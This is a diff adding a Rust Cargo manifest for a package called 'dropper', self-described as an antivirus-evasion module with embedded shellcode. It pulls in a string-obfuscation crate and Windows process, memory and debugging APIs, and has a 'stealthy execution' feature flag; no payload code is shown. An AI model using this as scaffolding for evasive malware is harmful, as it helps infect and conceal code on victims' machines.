@@ -1,0 +1,46 @@
+[package]
+name = "dropper"
+version = "1.0.0"
+edition = "2021"
+description = "C2R2 Dropper - AV Evasion Module with Embedded Shellcode"
+
+[features]
+default = []
+production = []  # Production mode: stealthy execution
+
+[[bin]]
+name = "dropper"
+path = "src/main.rs"
+
+[dependencies]
+# Compile-time string obfuscation
+obfstr = "0.4"
+# Random number generation
+rand = "0.8"
+
+[target.'cfg(windows)'.dependencies]
+winapi = { version = "0.3", features = [
+    "processthreadsapi",
+    "handleapi",
+    "memoryapi",
+    "winbase",
+    "fileapi",
+    "shellapi",
+    "winuser",
+    "errhandlingapi",
+    "synchapi",
+    "sysinfoapi",
+    "debugapi",
+    "libloaderapi",
+    "winnt"
+] }
+
+[target.'cfg(windows)'.build-dependencies]
+winres = "0.1.12"
+
+[profile.release]
+panic = "abort"
+lto = true
+codegen-units = 1
+opt-level = "z"
+strip = true
